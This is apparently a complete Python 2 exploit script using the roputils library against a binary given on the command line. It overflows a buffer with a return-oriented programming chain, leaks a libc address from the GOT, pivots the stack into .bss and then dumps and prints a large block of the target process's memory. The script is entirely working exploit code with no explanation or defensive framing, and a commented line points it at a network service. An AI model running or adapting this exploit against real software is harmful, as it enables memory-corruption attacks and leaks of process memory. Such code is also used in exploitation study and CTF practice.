from roputils import *

fpath = sys.argv[1]
offset = int(sys.argv[2])

rop = ROP(fpath)
addr_stage = rop.section('.bss') + 0x800

buf = rop.fill(offset)
buf += rop.call_chain_plt(
    ['write', 1, rop.got('__libc_start_main'), 8],
    ['read', 0, addr_stage, 400]
, pivot=addr_stage)

# p = Proc(host='localhost', port=5000)
p = Proc(rop.fpath)

p.write(p32(len(buf)) + buf)
print "[+] read: %r" % p.read(len(buf))
ref_addr = p.read_p64()

buf = rop.junk()
buf += rop.call_chain_plt(
    ['write', 1, ref_addr, 0x200000]
)
buf += rop.fill(400, buf)

p.write(buf)
print p.strings()
p.close()
